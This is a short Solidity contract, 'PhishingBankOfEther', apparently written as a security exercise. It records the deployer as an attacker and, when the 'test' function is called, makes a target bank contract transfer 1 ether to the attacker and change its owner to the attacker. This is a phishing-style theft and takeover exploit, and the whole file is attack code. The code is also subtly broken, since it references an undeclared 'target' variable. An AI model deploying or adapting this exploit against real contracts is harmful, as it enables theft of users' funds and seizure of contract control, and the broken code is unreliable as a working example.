// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;
   
interface targetInterface {
    function transferTo(address payable to, uint amount)  payable external;
    function changeOwner(address newOwner) external;
    function kill() external;
}
   
contract PhishingBankOfEther {
    address payable attackerAddress;
    
    constructor() public {
        attackerAddress = msg.sender;
    }
    
    targetInterface bankInterface = targetInterface(target);
 
    function test () payable public {
        bankInterface.transferTo(attackerAddress, 1 ether);
        bankInterface.changeOwner(attackerAddress);
    }
}